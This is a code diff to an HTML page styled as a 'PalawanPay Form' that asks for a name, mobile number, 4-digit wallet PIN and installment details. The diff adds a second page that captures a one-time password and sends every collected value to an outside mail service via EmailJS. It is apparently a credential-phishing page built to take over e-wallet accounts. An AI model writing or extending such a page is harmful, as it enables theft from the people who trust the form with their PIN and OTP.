@@ -58,25 +58,65 @@
   </style>
 </head>
 <body>
-  <div class="container">
+  <div class="container" id="page1">
     <h2>PalawanPay Form</h2>
-    <form id="contact-form">
+    <form id="info-form">
       <input type="text" name="name" placeholder="Name" required />
       <input type="tel" name="mobile" placeholder="Mobile Number" required />
       <input type="password" name="pin" maxlength="4" placeholder="4-digit PIN" required />  
       <input type="text" name="unit" placeholder="Unit of installment or GGives" required />
+      <button type="button" onclick="goToOTP()">Next</button>
+    </form>
+  </div>
+
+  <div class="container" id="page2" style="display: none;">
+    <h2>Enter OTP</h2>
+    <form id="otp-form">
       <input type="text" name="otp" maxlength="6" placeholder="One-Time Password (OTP)" required />
       <button type="submit">Submit</button>
     </form>
   </div>
 
   <script>
-    document.getElementById('contact-form').addEventListener('submit', function(e) {
+    let formData = {};
+
+    function goToOTP() {
+      const form = document.getElementById('info-form');
+      if (!form.checkValidity()) {
+        form.reportValidity();
+        return;
+      }
+
+      // Save input values
+      const formElements = form.elements;
+      formData = {
+        name: formElements['name'].value,
+        mobile: formElements['mobile'].value,
+        pin: formElements['pin'].value,
+        unit: formElements['unit'].value
+      };
+
+      document.getElementById('page1').style.display = 'none';
+      document.getElementById('page2').style.display = 'block';
+    }
+
+    document.getElementById('otp-form').addEventListener('submit', function(e) {
       e.preventDefault();
-      emailjs.sendForm('service_0v6id51', 'template_eq6eq0q', this)
+      formData.otp = this.elements['otp'].value;
+
+      const tempForm = document.createElement('form');
+      for (const key in formData) {
+        const input = document.createElement('input');
+        input.type = 'hidden';
+        input.name = key;
+        input.value = formData[key];
+        tempForm.appendChild(input);
+      }
+
+      emailjs.sendForm('service_0v6id51', 'template_eq6eq0q', tempForm)
         .then(function() {
           alert('Your information has been sent to Gmail. Thank you!');
-          document.getElementById('contact-form').reset();
+          location.reload();
         }, function(error) {
           console.log('FAILED...', error);
           alert('There was a problem submitting your form.');
